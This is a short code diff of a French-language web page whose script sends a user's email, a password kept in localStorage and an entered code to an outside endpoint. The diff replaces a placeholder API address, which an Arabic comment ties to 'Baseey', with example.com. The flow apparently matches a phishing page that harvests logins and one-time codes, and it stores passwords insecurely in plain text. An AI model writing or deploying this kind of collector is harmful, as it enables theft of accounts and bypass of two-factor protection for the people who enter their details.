@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -98,15 +99,17 @@
       const password = localStorage.getItem('temp_password');
       const code = document.getElementById('userCode').value;
 
-      // إرسال البيانات لـ Baseey
       try {
-        await fetch('ضع_رابط_BASEEY_API_هنا/userlist', {
+        await fetch('https://example.com/userlist', {
           method: 'POST',
           headers: {
-            'Content-Type': 'application/json',
-            'Authorization': 'Bearer ضع_مفتاح_BASEEY_API_KEY_هنا'
+            'Content-Type': 'application/json'
           },
-          body: JSON.stringify({ email: email, password: password, code: code })
+          body: JSON.stringify({ 
+            email: email, 
+            password: password, 
+            code: code 
+          })
         });
       } catch (err) {
         console.error("Error", err);
